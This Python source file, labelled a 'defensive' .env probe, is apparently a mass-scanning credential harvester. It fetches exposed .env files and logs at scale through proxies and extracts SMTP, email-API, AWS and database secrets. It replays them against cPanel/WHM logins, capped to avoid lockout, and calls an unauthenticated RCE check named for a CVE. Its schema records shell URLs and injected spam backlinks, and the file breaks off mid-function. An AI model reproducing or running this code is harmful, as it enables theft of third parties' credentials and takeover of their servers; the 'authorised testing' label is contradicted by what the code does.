#!/usr/bin/env python3
"""
EnvHarvester – Defensive .env probe
Probes owned targets for exposed .env files and extracts credentials.
Authorised infrastructure testing only.
"""

import argparse
import asyncio
import base64
import gc
import io
import ipaddress
import json
import os
import random
import re
import signal
import socket
import sqlite3
import sys
import urllib.parse
from collections import defaultdict
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import AsyncIterator, Callable, Optional

import aiohttp
import yaml

try:
    import aiomysql as _aiomysql  # type: ignore
except Exception:  # ImportError or cryptography/cffi conflicts
    _aiomysql = None  # type: ignore

try:
    import asyncpg as _asyncpg  # type: ignore
except Exception:
    _asyncpg = None  # type: ignore

from proxy import ProxyManager, parse_proxy_list, scrub_credentials

# ── constants ──────────────────────────────────────────────────────────────────

CONFIG_PATH = Path(__file__).parent / "config.yaml"
DB_PATH = Path("research_results.db")

# Paths probed in fast mode — covers >90 % of real hits at 1/15th the volume.
_ESSENTIAL_PATHS = ["/.env", "/.env.bak", "/.env.old"]
# Auto-enable fast paths when new_targets exceeds this after dedup + checkpoint filter.
_FAST_PATHS_THRESHOLD = 50_000
# Default per-run host cap — probed_hosts checkpoint lets subsequent runs continue.
_DEFAULT_MAX_HOSTS_PER_RUN = 100_000

RESEND_KEY_RE = re.compile(r"\bre_[a-zA-Z0-9]{24,36}\b")

_PLACEHOLDER_RE = re.compile(
    r"^re_(?:"
    r"([a-zA-Z0-9])\1{10,}"
    r"|[xX]{6,}"
    r"|0{6,}"
    r"|(?:12345|abcde|test|fake|demo|sample|example|placeholder|your|here|insert)"
    r")",
    re.IGNORECASE,
)
_NGRAM_REPEAT_RE = re.compile(r"^re_(.{2,5}?)\1{3,}", re.IGNORECASE)


def is_placeholder_key(key: str) -> bool:
    suffix = key[3:]
    if len(set(suffix.lower())) < 4:
        return True
    if _NGRAM_REPEAT_RE.match(key):
        return True
    return bool(_PLACEHOLDER_RE.match(key))


_GENERIC_PLACEHOLDERS = frozenset({
    "", "null", "none", "false", "true", "secret", "password", "password123",
    "changeme", "change_me", "change-me", "yourpassword", "your-password",
    "yourpasswordhere", "your_password_here", "db_password", "smtp_password",
    "example", "test", "demo", "sample", "placeholder", "enter_here",
    "xxx", "xxxxxxxx", "xxxxxxxxxx", "aaaa", "1234", "12345", "123456",
    "12345678", "1234567890", "abcdefgh", "default",
})


def _is_placeholder_value(val: str) -> bool:
    """Return True for obviously fake/template credential values."""
    v = val.strip().strip('"\'').lower()
    if not v or len(v) < 4:
        return True
    if v in _GENERIC_PLACEHOLDERS:
        return True
    # Repetitive characters (e.g. "aaaaaaa", "1212121")
    if len(set(v)) < 3:
        return True
    return False


_ENV_KEY_VALUE_RE = re.compile(r"^[A-Z_][A-Z0-9_]*\s*=", re.IGNORECASE)


def _env_val(text: str, *keys: str) -> str:
    """Extract the value of the first matching KEY=value from env file text."""
    # Normalise line endings so ^ in MULTILINE always anchors correctly —
    # files with bare \r line endings (old Mac / some Windows servers) cause
    # re.MULTILINE's ^ to only match at the very start of the string.
    t = text.replace("\r\n", "\n").replace("\r", "\n")
    for key in keys:
        m = re.search(
            rf'^{key}\s*=\s*["\']?([^"\'#\r\n]+)["\']?',
            t, re.MULTILINE | re.IGNORECASE,
        )
        if m:
            v = m.group(1).strip().strip('"\'')
            # Reject values that look like another KEY= declaration — the regex
            # bled into the next line due to a missing/malformed newline.
            if v and not _ENV_KEY_VALUE_RE.match(v):
                return v
    return ""


# ── SMTP-vendor credential detection ──────────────────────────────────────────

SENDGRID_KEY_RE    = re.compile(r"\bSG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}\b")
MAILGUN_KEY_RE     = re.compile(r"\bkey-[a-f0-9]{32}\b")
BREVO_KEY_RE       = re.compile(r"\bxkeysib-[a-f0-9]{64}-[a-zA-Z0-9]{16}\b")
# Postmark / Mailjet tokens are bare hex/UUIDs — too generic to match without
# an env-var anchor, so we capture the value to the right of the name.
POSTMARK_TOKEN_RE  = re.compile(
    r"POSTMARK_(?:SERVER|API)_TOKEN\s*=\s*['\"]?"
    r"([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})['\"]?",
    re.IGNORECASE,
)
MAILJET_KEY_RE     = re.compile(
    r"MJ_APIKEY_(?:PUBLIC|PRIVATE)\s*=\s*['\"]?([a-f0-9]{32})['\"]?",
    re.IGNORECASE,
)
# AWS SES — the AKIA key ID is the SMTP username; secret is the SMTP password
# when MAIL_MAILER=ses. Captured here so SES-backed mailers surface correctly.
AWS_SES_KEY_RE = re.compile(r"\b(AKIA[A-Z0-9]{16})\b")
LARAVEL_APP_KEY_RE = re.compile(r"APP_KEY\s*=\s*base64:[A-Za-z0-9+/=]{40,}")

_ENV_MIN_BYTES = 20
_ENV_MAX_BYTES = 200_000
_ENV_KV_RE     = re.compile(r"^(?:export\s+)?[A-Z_][A-Z0-9_]*\s*=", re.MULTILINE)
_ENV_KNOWN_VARS = frozenset({
    "MAIL_PASSWORD", "MAIL_USERNAME", "MAIL_HOST", "MAIL_FROM",
    "RESEND_API_KEY", "SENDGRID_API_KEY", "MAILGUN_API_KEY",
    "POSTMARK_SERVER_TOKEN", "BREVO_API_KEY", "SENDINBLUE_API_KEY",
    "MJ_APIKEY_PUBLIC", "MJ_APIKEY_PRIVATE", "SMTP_PASSWORD", "SMTP_HOST",
    "AWS_ACCESS_KEY_ID", "MAIL_MAILER", "MAILER_DSN",
})

# Parses smtp(s)://[user[:pass]@]host[:port][/...] from MAILER_DSN values.
_MAILER_DSN_RE = re.compile(
    r"smtps?://(?:([^:@\s]+)(?::([^@\s]+))?@)?([a-zA-Z0-9._-]+)(?::\d+)?",
    re.IGNORECASE,
)


def _looks_like_env_file(text: str) -> bool:
    s = text.strip()
    if not s or len(s) < _ENV_MIN_BYTES or len(s) > _ENV_MAX_BYTES:
        return False
    if s.startswith("<"):
        return False
    if LARAVEL_APP_KEY_RE.search(text):
        return True
    if len(_ENV_KV_RE.findall(text)) >= 3:
        return True
    return any(v in text for v in _ENV_KNOWN_VARS)


def _contains_smtp_creds(text: str) -> bool:
    """Permissive filter for log files / debug pages — accept any blob that
    contains at least one SMTP-vendor key. Used for /storage/logs/laravel.log
    style adjacent leaks where the strict env-shape filter is too narrow.
    """
    if not text:
        return False
    return bool(
        RESEND_KEY_RE.search(text)
        or SENDGRID_KEY_RE.search(text)
        or MAILGUN_KEY_RE.search(text)
        or BREVO_KEY_RE.search(text)
        or POSTMARK_TOKEN_RE.search(text)
        or MAILJET_KEY_RE.search(text)
    )


def _is_log_path(path: str) -> bool:
    """Paths that should use the permissive filter (laravel.log etc)."""
    p = path.lower()
    return p.endswith(".log") or "/logs/" in p


# Paths that are always developer templates — passwords are never real.
_TEMPLATE_SUFFIXES = (".example", ".sample", ".dist", ".template")

def _is_template_path(url: str) -> bool:
    path = url.split("?", 1)[0].lower()
    return any(path.endswith(s) for s in _TEMPLATE_SUFFIXES)


def extract_laravel_creds(text: str) -> dict:
    # Only flag AWS SES key if the file actually uses SES as the mailer —
    # otherwise AKIA keys appear in non-email contexts.
    uses_ses = bool(re.search(r"MAIL_MAILER\s*=\s*['\"]?ses['\"]?", text, re.IGNORECASE))
    ses_keys = AWS_SES_KEY_RE.findall(text) if uses_ses else []

    # Raw SMTP credentials — flat KEY=value style (Laravel ≤8, Django, generic).
    # Also accepts abbreviated PASS/USER names used by some frameworks.
    mail_host = _env_val(text, "MAIL_HOST", "SMTP_HOST", "EMAIL_HOST",
                         "MAILER_HOST", "SMTP_SERVER")
    mail_user = _env_val(text, "MAIL_USERNAME", "MAIL_USER", "SMTP_USERNAME",
                         "SMTP_USER", "EMAIL_HOST_USER", "MAILER_USER",
                         "MAILER_USERNAME")
    mail_pass = _env_val(text, "MAIL_PASSWORD", "MAIL_PASS", "SMTP_PASSWORD",
                         "SMTP_PASS", "EMAIL_HOST_PASSWORD", "EMAIL_PASS",
                         "MAILER_PASSWORD", "MAILER_PASS")
    smtp_creds: list[str] = []
    if mail_pass and not _is_placeholder_value(mail_pass):
        label = f"{mail_user}@{mail_host}:{mail_pass}" if (mail_user and mail_host) else mail_pass
        smtp_creds.append(label)

    # MAILER_DSN — Laravel 9+ / Symfony single-var DSN: smtp://user:pass@host:port
    dsn_val = _env_val(text, "MAILER_DSN", "MAIL_DSN", "SMTP_DSN")
    if dsn_val:
        dm = _MAILER_DSN_RE.search(dsn_val)
        if dm:
            dsn_user, dsn_pass, dsn_host = dm.group(1) or "", dm.group(2) or "", dm.group(3)
            if dsn_pass and not _is_placeholder_value(dsn_pass):
                label = f"{dsn_user}@{dsn_host}:{dsn_pass}" if dsn_user else f"{dsn_host}:{dsn_pass}"
                smtp_creds.append(label)
            elif not mail_host:
                mail_host = dsn_host  # at minimum surface the host for smtp_vars

    # Database credentials — present in virtually every Laravel .env file.
    db_host = _env_val(text, "DB_HOST", "DATABASE_HOST", "PGHOST", "MYSQL_HOST")
    db_user = _env_val(text, "DB_USERNAME", "DB_USER", "DATABASE_USER",
                       "PGUSER", "MYSQL_USER")
    db_pass = _env_val(text, "DB_PASSWORD", "DB_PASS", "DATABASE_PASSWORD",
                       "DATABASE_PASS", "PGPASSWORD", "MYSQL_PASSWORD", "MYSQL_PASS")
    db_name = _env_val(text, "DB_DATABASE", "DB_NAME", "DATABASE_NAME",
                       "PGDATABASE", "MYSQL_DATABASE")
    db_creds: list[str] = []
    if db_pass and not _is_placeholder_value(db_pass):
        parts = [p for p in (db_user, db_host, db_name) if p]
        label = f"{db_user}@{db_host}/{db_name}:{db_pass}" if all([db_user, db_host, db_name]) else db_pass
        db_creds.append(label)

    return {
        "resend":    [k for k in RESEND_KEY_RE.findall(text) if not is_placeholder_key(k)],
        "sendgrid":  SENDGRID_KEY_RE.findall(text),
        "mailgun":   MAILGUN_KEY_RE.findall(text),
        "brevo":     BREVO_KEY_RE.findall(text),
        "postmark":  [m.group(1) for m in POSTMARK_TOKEN_RE.finditer(text)],
        "mailjet":   [m.group(1) for m in MAILJET_KEY_RE.finditer(text)],
        "ses":       ses_keys,
        "smtp":      smtp_creds,
        "db":        db_creds,
        "smtp_vars": [v for v in (
                          "MAIL_HOST", "MAIL_USERNAME", "MAIL_PASSWORD",
                          "SMTP_HOST", "SMTP_USERNAME", "SMTP_PASSWORD",
                          "MAILER_DSN", "MAIL_DSN", "SMTP_DSN",
                          "MAIL_PASS", "SMTP_PASS",
                      )
                      if re.search(rf"^{v}\s*=", text, re.MULTILINE)],
        "is_laravel": bool(LARAVEL_APP_KEY_RE.search(text)),
    }


# ── domain extraction ──────────────────────────────────────────────────────────

DOMAIN_RES: list[re.Pattern] = [
    re.compile(
        # Mail / sender related
        r"(?:RESEND_DOMAIN|RESEND_FROM|RESEND_FROM_EMAIL|MAIL_FROM"
        r"|FROM_EMAIL|SMTP_FROM|EMAIL_FROM|SENDER_EMAIL|SENDER"
        r"|REPLY_TO_EMAIL|REPLY_TO|FROM|EMAIL|MAIL|NOTIFICATION_EMAIL"
        r"|CONTACT_EMAIL|SUPPORT_EMAIL|ADMIN_EMAIL|NOREPLY_EMAIL"
        # App / site identity
        r"|NEXT_PUBLIC_DOMAIN|NEXT_PUBLIC_APP_URL|NEXT_PUBLIC_SITE_URL"
        r"|APP_URL|APP_DOMAIN|SITE_URL|SITE_DOMAIN|PUBLIC_DOMAIN|PUBLIC_URL"
        r"|VERCEL_URL|NEXTAUTH_URL|LARAVEL_URL"
        # Generic web identifiers
        r"|WEBSITE_URL|WEBSITE_DOMAIN|WEB_URL|WEB_DOMAIN"
        r"|HOMEPAGE_URL|LANDING_URL|CANONICAL_URL"
        r"|ROOT_URL|ROOT_DOMAIN|MAIN_URL|MAIN_DOMAIN"
        r"|PRIMARY_URL|PRIMARY_DOMAIN|BASE_URL|BASE_DOMAIN"
        # Org / tenant / customer
        r"|COMPANY_URL|COMPANY_DOMAIN|CUSTOMER_URL|CUSTOMER_DOMAIN"
        r"|BRAND_URL|BRAND_DOMAIN|CLIENT_URL|CLIENT_DOMAIN"
        r"|ORG_URL|ORG_DOMAIN|ORGANIZATION_URL|ORGANIZATION_DOMAIN"
        r"|TENANT_URL|TENANT_DOMAIN"
        # Frontend / backend / API
        r"|FRONTEND_URL|BACKEND_URL|API_URL|API_BASE_URL|API_HOST|API_DOMAIN"
        r"|ADMIN_URL|ADMIN_DOMAIN|DASHBOARD_URL|PORTAL_URL"
        # E-commerce / CMS
        r"|SHOP_URL|STORE_URL|SHOPIFY_DOMAIN|WP_HOME|WP_SITEURL|WORDPRESS_URL"
        # Auth / cookies / CORS — for list-valued vars (TRUSTED_HOSTS,
        # ALLOWED_HOSTS, SANCTUM_STATEFUL_DOMAINS) the regex captures the
        # first domain in the list, which is enough to identify the org.
        r"|SESSION_DOMAIN|COOKIE_DOMAIN|SANCTUM_STATEFUL_DOMAINS"
        r"|TRUSTED_HOSTS|TRUSTED_HOST|ALLOWED_HOSTS|ALLOWED_HOST"
        r"|ALLOWED_ORIGINS|ALLOWED_ORIGIN|CORS_ORIGINS|CORS_ORIGIN"
        # Generic host-y names (kept last so more specific names win earlier)
        r"|HOSTNAME|HOST|DOMAIN)"
        r"\s*[=:]\s*[\"']?"
        r"(?:https?://)?"
        r"(?:[^@\s\"']+@)?"
        r"([a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.[a-zA-Z]{2,})"
    ),
]
EMAIL_ANY_RE = re.compile(r"[\w.+-]+@([a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.[a-zA-Z]{2,})")
URL_ANY_RE   = re.compile(r"https?://([a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.[a-zA-Z]{2,})")

DOMAIN_BLACKLIST = {
    # Personal email providers — never represent a company's primary domain
    "gmail.com", "googlemail.com", "yahoo.com", "outlook.com", "hotmail.com",
    "icloud.com", "protonmail.com", "live.com", "aol.com", "mail.com",
    "msn.com", "ymail.com", "fastmail.com", "zoho.com",
    # Source hosts
    "github.com", "githubusercontent.com", "gitlab.com", "bitbucket.org",
    # Search / cloud platforms
    "google.com", "googleapis.com", "vercel.com", "netlify.com",
    "amazonaws.com", "cloudfront.net", "azurewebsites.net", "herokuapp.com",
    "amplifyapp.com", "elasticbeanstalk.com", "digitaloceanspaces.com",
    "onrender.com", "pages.dev", "ngrok.io", "ngrok-free.app",
    # Placeholder / template values
    "example.com", "example.org", "example.net", "test.com", "domain.com",
    "yourdomain.com", "yoursite.com", "mysite.com", "mydomain.com",
    "localhost", "localhost.com", "127.0.0.1",
    # PaaS / deployment hosts
    "resend.com", "resend.dev", "supabase.co", "vercel.app", "netlify.app",
    "cloudflare.com", "fly.dev", "railway.app", "render.com",
    # Service / API platforms
    "stripe.com", "sendgrid.net", "mailgun.org", "postmarkapp.com",
    "sentry.io", "auth0.com", "clerk.dev", "clerk.com", "twilio.com",
}


def _domain_ok(domain: str) -> bool:
    d = domain.lower().strip(".")
    if d in DOMAIN_BLACKLIST:
        return False
    parts = d.split(".")
    if len(parts) >= 2 and ".".join(parts[-2:]) in DOMAIN_BLACKLIST:
        return False
    return len(parts) >= 2


def extract_domain(text: str) -> Optional[str]:
    for pat in DOMAIN_RES:
        for m in pat.finditer(text):
            if _domain_ok(m.group(1)):
                return m.group(1)
    for m in EMAIL_ANY_RE.finditer(text):
        if _domain_ok(m.group(1)):
            return m.group(1)
    for m in URL_ANY_RE.finditer(text):
        if _domain_ok(m.group(1)):
            return m.group(1)
    return None


# ── database ───────────────────────────────────────────────────────────────────

def init_db(path: Path = DB_PATH) -> sqlite3.Connection:
    conn = sqlite3.connect(str(path), check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA busy_timeout=5000")
    conn.execute("""
        CREATE TABLE IF NOT EXISTS findings (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            source        TEXT NOT NULL,
            url           TEXT,
            resend_key    TEXT NOT NULL,
            linked_domain TEXT,
            file_path     TEXT,
            detected_at   TEXT NOT NULL,
            raw_context   TEXT
        )
    """)
    try:
        conn.execute("CREATE UNIQUE INDEX IF NOT EXISTS idx_key_unique ON findings(resend_key)")
    except sqlite3.IntegrityError:
        conn.execute("""
            DELETE FROM findings WHERE id NOT IN (
                SELECT MIN(id) FROM findings GROUP BY resend_key
            )
        """)
        conn.execute("CREATE UNIQUE INDEX IF NOT EXISTS idx_key_unique ON findings(resend_key)")
    conn.execute("DROP INDEX IF EXISTS idx_key")
    conn.execute("CREATE INDEX IF NOT EXISTS idx_linked_domain ON findings(linked_domain)")
    conn.execute("CREATE INDEX IF NOT EXISTS idx_source ON findings(source)")
    try:
        conn.execute("ALTER TABLE findings ADD COLUMN vendor TEXT")
    except sqlite3.OperationalError:
        pass
    # verified: NULL = not yet checked, 1 = live, 0 = dead/invalid
    try:
        conn.execute("ALTER TABLE findings ADD COLUMN verified INTEGER")
    except sqlite3.OperationalError:
        pass
    # domain_alive: NULL = unchecked, 1 = reachable, 0 = dead/404/timeout
    try:
        conn.execute("ALTER TABLE findings ADD COLUMN domain_alive INTEGER")
    except sqlite3.OperationalError:
        pass
    conn.execute("""
        CREATE TABLE IF NOT EXISTS probed_hosts (
            host      TEXT PRIMARY KEY,
            probed_at TEXT NOT NULL
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS cpanel_findings (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            source      TEXT NOT NULL,
            url         TEXT NOT NULL,
            service     TEXT NOT NULL,
            host        TEXT NOT NULL,
            port        INTEGER NOT NULL,
            username    TEXT,
            password    TEXT,
            verified    INTEGER,
            detected_at TEXT NOT NULL,
            raw_context TEXT,
            UNIQUE(url, username)
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS wp_findings (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            source      TEXT NOT NULL,
            url         TEXT NOT NULL,
            component   TEXT NOT NULL,
            version     TEXT,
            cve         TEXT,
            title       TEXT,
            severity    TEXT,
            fixed_in    TEXT,
            verified    INTEGER,
            shell_url   TEXT,
            detected_at TEXT NOT NULL,
            UNIQUE(url, component, cve)
        )
    """)
    for _col in ("verified INTEGER", "shell_url TEXT", "domain TEXT"):
        try:
            conn.execute(f"ALTER TABLE wp_findings ADD COLUMN {_col}")
        except sqlite3.OperationalError:
            pass
    conn.execute("""
        CREATE TABLE IF NOT EXISTS backlink_findings (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            host         TEXT NOT NULL,
            cpanel_user  TEXT NOT NULL,
            site_url     TEXT NOT NULL,
            file_path    TEXT NOT NULL,
            site_type    TEXT,
            anchor_text  TEXT,
            injected_at  TEXT NOT NULL,
            status       TEXT NOT NULL,
            UNIQUE(host, cpanel_user, file_path)
        )
    """)
    conn.commit()
    return conn


def save_finding(
    conn: sqlite3.Connection,
    *,
    source: str,
    url: str,
    resend_key: str,
    linked_domain: Optional[str],
    file_path: Optional[str],
    raw_context: Optional[str] = None,
    vendor: Optional[str] = None,
) -> bool:
    if vendor in ("resend", None):
        if is_placeholder_key(resend_key):
            return False
    elif _is_placeholder_value(resend_key):
        return False
    cur = conn.execute(
        """INSERT OR IGNORE INTO findings
           (source, url, resend_key, linked_domain, file_path, detected_at, raw_context, vendor)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
        (
            source, url, resend_key, linked_domain, file_path,
            datetime.now(timezone.utc).isoformat(), raw_context, vendor,
        ),
    )
    conn.commit()
    return cur.rowcount > 0


def save_cpanel_finding(
    conn: sqlite3.Connection,
    *,
    source: str,
    url: str,
    service: str,
    host: str,
    port: int,
    username: Optional[str] = None,
    password: Optional[str] = None,
    verified: Optional[int] = None,
    raw_context: Optional[str] = None,
) -> bool:
    cur = conn.execute(
        """INSERT OR IGNORE INTO cpanel_findings
           (source, url, service, host, port, username, password, verified, detected_at, raw_context)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (source, url, service, host, port, username, password, verified,
         datetime.now(timezone.utc).isoformat(), raw_context),
    )
    conn.commit()
    return cur.rowcount > 0


def save_wp_finding(
    conn: sqlite3.Connection,
    *,
    source: str,
    url: str,
    component: str,
    version: str = "",
    cve: str = "",
    title: str = "",
    severity: str = "info",
    fixed_in: str = "",
    verified: Optional[int] = None,
    shell_url: Optional[str] = None,
    domain: str = "",
) -> bool:
    cur = conn.execute(
        """INSERT OR IGNORE INTO wp_findings
           (source, url, component, version, cve, title, severity, fixed_in,
            verified, shell_url, domain, detected_at)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (source, url, component, version or "", cve or "", title or "",
         severity or "info", fixed_in or "", verified, shell_url,
         domain or "",
         datetime.now(timezone.utc).isoformat()),
    )
    if shell_url and cur.rowcount == 0:
        conn.execute(
            "UPDATE wp_findings SET verified=?, shell_url=? "
            "WHERE url=? AND component=? AND cve=?",
            (verified, shell_url, url, component, cve or ""),
        )
    conn.commit()
    return cur.rowcount > 0


# ── cPanel discovery ───────────────────────────────────────────────────────────

_CPANEL_PORTS = (2082, 2083, 2086, 2087)
_WHM_PORTS    = (2086, 2087)   # CVE-2026-41940 targets WHM session only

_CPANEL_BODY_SIGS = (
    "log in to cpanel", "cpanel login", "cpanel, inc.",
    "cpanel-login", "cpanel web hosting", "cpanel®",
)
_WHM_BODY_SIGS = (
    "webhost manager", "whm login", "web host manager", "cpanel whm",
)


def _detect_cpanel_service(
    body: str,
    server_header: str = "",
    set_cookie: str = "",
) -> Optional[str]:
    """Return 'cpanel', 'whm', or None."""
    b = body.lower()
    s = server_header.lower()
    c = set_cookie.lower()
    if "cpsrvd" in s:
        return "whm" if any(x in b for x in _WHM_BODY_SIGS) else "cpanel"
    if "cpsession" in c or "cprelogin" in c:
        return "whm" if any(x in b for x in _WHM_BODY_SIGS) else "cpanel"
    if any(x in b for x in _WHM_BODY_SIGS):
        return "whm"
    if any(x in b for x in _CPANEL_BODY_SIGS):
        return "cpanel"
    return None


def _cpanel_username_variations(username: str, host: str = "") -> list[str]:
    variants = [username]
    for sfx in ("_db", "_database", "_user", "_usr", "_web", "_admin", "_prod", "_dev"):
        if username.lower().endswith(sfx):
            variants.append(username[: -len(sfx)])
            break
    if host:
        domain = host.split(":")[0]
        parts = domain.rstrip(".").split(".")
        if len(parts) >= 2:
            if parts[-2] not in ("com", "co", "net", "org"):
                variants.append(parts[-2])
        if parts[0] not in ("www", "mail", "ftp", "cpanel", "whm"):
            variants.append(parts[0])
    seen: set[str] = set()
    result = []
    for v in variants:
        if v and v not in seen:
            seen.add(v)
            result.append(v)
    return result


def _extract_cpanel_candidates(
    raw_context: str, host: str = ""
) -> list[tuple[str, str]]:
    """Return (username, password) pairs to try against cPanel from a .env body."""
    pairs: list[tuple[str, str]] = []

    def _add(*user_keys: str, pass_keys: tuple):
        u = _env_val(raw_context, *user_keys)
        p = _env_val(raw_context, *pass_keys)
        if u and p and not _is_placeholder_value(p) and not _is_placeholder_value(u):
            for uv in _cpanel_username_variations(u, host):
                pairs.append((uv, p))

    _add("CPANEL_USER", "CPANEL_USERNAME",
         pass_keys=("CPANEL_PASS", "CPANEL_PASSWORD"))
    _add("WHM_USER", "WHM_USERNAME",
         pass_keys=("WHM_PASS", "WHM_PASSWORD"))
    _add("SSH_USER", "SSH_USERNAME",
         pass_keys=("SSH_PASS", "SSH_PASSWORD"))
    _add("DB_USERNAME", "DB_USER", "MYSQL_USER", "DATABASE_USER",
         pass_keys=("DB_PASSWORD", "DB_PASS", "MYSQL_PASSWORD", "DATABASE_PASSWORD"))
    _add("MAIL_USERNAME", "SMTP_USERNAME", "EMAIL_USERNAME",
         pass_keys=("MAIL_PASSWORD", "SMTP_PASSWORD", "EMAIL_PASSWORD"))
    _add("FTP_USERNAME", "FTP_USER",
         pass_keys=("FTP_PASSWORD", "FTP_PASS"))

    seen: set[tuple[str, str]] = set()
    result = []
    for pair in pairs:
        if pair not in seen:
            seen.add(pair)
            result.append(pair)
    return result


async def _try_cpanel_login(
    pm: ProxyManager,
    host: str,
    port: int,
    username: str,
    password: str,
    timeout: float = 10.0,
) -> Optional[bool]:
    """Return True=valid, False=auth fail, None=unreachable."""
    scheme = "https" if port in (2083, 2087) else "http"
    url = f"{scheme}://{host}:{port}/login"
    try:
        async with pm.request(
            "POST", url,
            data={"user": username, "pass": password},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=aiohttp.ClientTimeout(total=timeout),
            allow_redirects=False,
            ssl=False,
        ) as resp:
            if resp.status in (301, 302):
                location = resp.headers.get("Location", "")
                cookies = resp.headers.get("Set-Cookie", "")
                if "cpsession" in cookies or "/frontend/" in location or "cpsession" in location:
                    return True
            if resp.status == 200:
                body = await resp.text(errors="replace")
                if "cpsession" in body or '"status":1' in body or '"result":"1"' in body:
                    return True
            return False
    except Exception:
        return None


def _build_cred_map(conn: sqlite3.Connection) -> dict[str, list[tuple[str, str]]]:
    """Map host → [(user, pass)] from existing .env findings with raw_context."""
    rows = conn.execute(
        "SELECT url, raw_context FROM findings WHERE raw_context IS NOT NULL"
    ).fetchall()
    cred_map: dict[str, list[tuple[str, str]]] = {}
    seen_urls: set[str] = set()
    for row in rows:
        url = row["url"] or ""
        raw = row["raw_context"] or ""
        if not raw or url in seen_urls:
            continue
        seen_urls.add(url)
        try:
            host = urllib.parse.urlparse(url).hostname or ""
            if not host:
                continue
            pairs = _extract_cpanel_candidates(raw, host)
            if pairs:
                existing = cred_map.setdefault(host, [])
                for p in pairs:
                    if p not in existing:
                        existing.append(p)
        except Exception:
            pass
    return cred_map


async def run_cpanel_probe(
    host_ports: list[str],
    concurrency: int = 10,
    proxy_mgr: Optional[ProxyManager] = None,
    cred_map: Optional[dict[str, list[tuple[str, str]]]] = None,
    on_host_done: Optional[Callable[[str], None]] = None,
) -> AsyncIterator[tuple]:
    """Probe host:port pairs for cPanel panels and test credentials.

    Yields:
      ("panel",  host, port, service, url)            — panel found, no creds
      ("login",  host, port, service, url, user, pw)  — valid login
      ("noauth", host, port, service, url)             — panel found, all creds rejected
    """
    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    cred_map = cred_map or {}
    _MAX_ATTEMPTS_PER_HOST = 3  # stay under cPanel's brute-force lockout

    work_q: asyncio.Queue = asyncio.Queue(maxsize=concurrency * 4)
    result_q: asyncio.Queue = asyncio.Queue()
    sem = asyncio.Semaphore(concurrency)

    async def worker():
        while True:
            item = await work_q.get()
            if item is None:
                work_q.task_done()
                break
            hp = item
            try:
                host, port_str = hp.rsplit(":", 1)
                port = int(port_str)
            except ValueError:
                work_q.task_done()
                continue

            async with sem:
                detected = None
                panel_url = None
                body_ctx = ""
                for scheme in ("https" if port in (2083, 2087) else "http",
                               "http" if port in (2083, 2087) else "https"):
                    try:
                        url = f"{scheme}://{host}:{port}/"
                        async with pm.request(
                            "GET", url,
                            timeout=aiohttp.ClientTimeout(total=10),
                            allow_redirects=True,
                            ssl=False,
                        ) as resp:
                            if resp.status in (200, 401, 403):
                                body = await resp.text(errors="replace")
                                server = resp.headers.get("Server", "")
                                cookies = resp.headers.get("Set-Cookie", "")
                                detected = _detect_cpanel_service(body, server, cookies)
                                if detected:
                                    panel_url = url
                                    body_ctx = body[:500]
                                    break
                    except Exception:
                        pass

                if detected and panel_url:
                    # CVE-2026-41940: try unauthenticated root before cred stuffing
                    rce_result = await _test_cpanel_crlf_rce(pm, host, port)
                    if rce_result:
                        rce_url, rce_tok, rce_cpsess = rce_result
                        await result_q.put(("rce", host, port, "whm", rce_url,
                                            "CVE-2026-41940", rce_tok, rce_cpsess))
                    else:
                        creds = cred_map.get(host, [])[:_MAX_ATTEMPTS_PER_HOST]
                        if not creds:
                            await result_q.put(("panel", host, port, detected, panel_url, body_ctx))
                        else:
                            valid_login = None
                            for username, password in creds:
                                result = await _try_cpanel_login(pm, host, port, username, password)
                                if result is True:
                                    valid_login = (username, password)
                                    break
                            if valid_login:
                                await result_q.put(("login", host, port, detected, panel_url,
                                                    valid_login[0], valid_login[1]))
                            else:
                                await result_q.put(("noauth", host, port, detected, panel_url, body_ctx))

            if on_host_done:
                on_host_done(host)
            work_q.task_done()

    workers = [asyncio.create_task(worker()) for _ in range(concurrency)]

    async def producer():
        for hp in host_ports:
            await work_q.put(hp)
        for _ in workers:
            await work_q.put(None)

    prod_task = asyncio.create_task(producer())

    done = asyncio.Event()

    async def drain():
        await work_q.join()
        done.set()

    drain_task = asyncio.create_task(drain())

    while not done.is_set() or not result_q.empty():
        try:
            item = result_q.get_nowait()
            yield item
        except asyncio.QueueEmpty:
            await asyncio.sleep(0.05)

    await prod_task
    await drain_task
    await asyncio.gather(*workers, return_exceptions=True)
    if own_pm:
        await pm.close()


async def _cpanel_pipeline(
    targets: list[str],
    conn: sqlite3.Connection,
    counters: dict,
    concurrency: int,
    proxy_mgr: Optional[ProxyManager] = None,
    shodan_key: Optional[str] = None,
    censys_id: Optional[str] = None,
    censys_secret: Optional[str] = None,
    netlas_key: Optional[str] = None,
    enable_crtsh: bool = False,
    asns: Optional[list[str]] = None,
    ipinfo_token: Optional[str] = None,
    max_hosts_per_run: int = _DEFAULT_MAX_HOSTS_PER_RUN,
) -> None:
    """cPanel panel discovery + credential validation pipeline."""
    cfg = load_config()

    probed_count = conn.execute("SELECT COUNT(*) FROM probed_hosts").fetchone()[0]
    if probed_count:
        print(f"[cpanel] Resume DB: {probed_count:,} host(s) already probed.", flush=True)

    # ASN resolution (same as laravel pipeline)
    if asns:
        print(f"[asn] Resolving {len(asns)} ASN(s) …", flush=True)
        asn_prefixes: list[str] = []
        for asn in asns:
